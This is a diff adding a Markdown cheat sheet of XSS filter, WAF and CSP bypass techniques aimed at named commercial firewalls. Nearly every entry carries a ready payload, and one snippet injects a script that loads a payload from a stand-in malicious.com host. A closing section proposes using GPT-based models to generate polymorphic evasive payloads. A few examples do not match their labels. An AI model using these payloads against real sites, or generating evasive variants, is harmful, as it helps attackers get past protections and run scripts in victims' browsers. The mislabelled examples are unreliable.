@@ -1,0 +1,65 @@
+# Advanced WAF Bypass Techniques
+
+## 1. Existing WAF Bypass Techniques
+
+### 1.1 XSS Filter Bypass Methods
+- **Case Sensitivity Bypass:** Mixing uppercase and lowercase letters in function names.
+  - Example: `<sCrIpT>alert(1)</ScRipT>` bypasses filters that look only for `<script>`.
+- **Tag Blacklist Bypass:** Using alternative tags to execute JavaScript.
+  - Example: `<script x>` can sometimes bypass strict `<script>` tag restrictions.
+- **Code Evaluation Bypass:** Using JavaScript functions to execute code dynamically.
+  - Example: `eval('ale'+'rt(0)')` reconstructs and executes an alert function.
+- **HTML Encoding Bypass:** Encoding payloads using HTML entities to evade detection.
+  - Example: `&#97;&#108;&#101;&#114;&#116;` decodes to `alert` in execution.
+- **UTF Encoding Bypass:** Using different character encodings to obscure payloads.
+  - Example: UTF-7 encoded `<script>alert(1)</script>` can bypass some filters.
+- **JSFuck Encoding:** Executing JavaScript using obfuscated character sequences.
+  - Example: `[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]...]` evaluates to `alert(1)`.
+
+### 1.2 Common WAF Bypass Techniques
+- **Cloudflare Bypass:** Exploiting unexpected event attributes to execute JavaScript.
+  - Example: `<svg/onrandom=random onload=confirm(1)>` triggers an alert when loaded.
+- **Incapsula WAF Bypass:** Injecting JavaScript within data URIs to evade filters.
+  - Example: `<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>` executes alert(1).
+- **Akamai WAF Bypass:** Injecting `<base>` tags to manipulate script loading paths.
+  - Example: `?"></script><base c=href=https://malicious.com>` changes execution context.
+- **WordFence WAF Bypass:** Encoding JavaScript in special characters inside HTML.
+  - Example: `<a href=javas&#99;ript:alert(1)>` bypasses naïve keyword detection.
+- **Fortiweb WAF Bypass:** Leveraging Unicode encoding to disguise payloads.
+  - Example: `><h1 onclick=alert('1')>` decodes to a valid XSS payload.
+
+### 1.3 CSP Bypass Methods
+- **JSONP-based Bypass:** Utilizing whitelisted domains to execute scripts.
+  - Example: `<script src=//google.com/complete/search?client=chrome&jsonp=alert(1);>`
+- **Inline Script Injection:** Injecting scripts via iframes to execute arbitrary JavaScript.
+  - Example: `f=document.createElement("iframe");f.src='/robots.txt';f.onload=()=>{x=document.createElement('script');x.src='//malicious.com/payload.js';document.body.appendChild(x)};document.body.appendChild(f);`
+- **CSP Nonce Bypass:** Hosting malicious scripts under allowed sources.
+  - Example: Attacker hosts a script at `https://trusted.com/malicious.js`, bypassing nonce restrictions.
+- **Unsafe Inline Bypass:** Exploiting misconfigured policies to execute JavaScript.
+  - Example: `"/><script>alert(1);</script>` executes despite CSP protections.
+
+---
+
+## 2. Potential Future Bypass Techniques
+
+### 2.1 AI-Assisted Payload Obfuscation
+- Leveraging AI-generated payloads to create unique and polymorphic XSS payloads that evolve dynamically to evade WAF detection.
+- Using GPT-based models to generate real-time, evasive JavaScript snippets.
+
+### 2.2 Browser-Based API Abuse
+- Abusing browser-native APIs such as `BroadcastChannel`, `SharedWorker`, or `StorageEvent` to exfiltrate sensitive data.
+- Manipulating WebAssembly (WASM) to execute JavaScript payloads indirectly.
+
+### 2.3 Unicode and RTL Character Exploitation
+- Mixing Right-to-Left (RTL) characters within payloads (`‮alert(1)`)
+- Using Homoglyphs to bypass pattern-based detection (e.g., `аlert(1)` where `а` is a Cyrillic character)
+
+### 2.4 Hybrid Encoding and Multi-Stage Execution
+- Chaining multiple encoding types (e.g., base64 + URL encoding + Unicode) to obfuscate execution paths.
+- Utilizing multi-stage script execution where each stage reveals a new payload dynamically.
+
+### 2.5 Exploiting JavaScript Prototype Pollution
+- Modifying global JavaScript objects (e.g., `Object.prototype.alert = function() {console.log('XSS!');}`)
+- Overwriting security-sensitive properties like `window.location`
+
+---
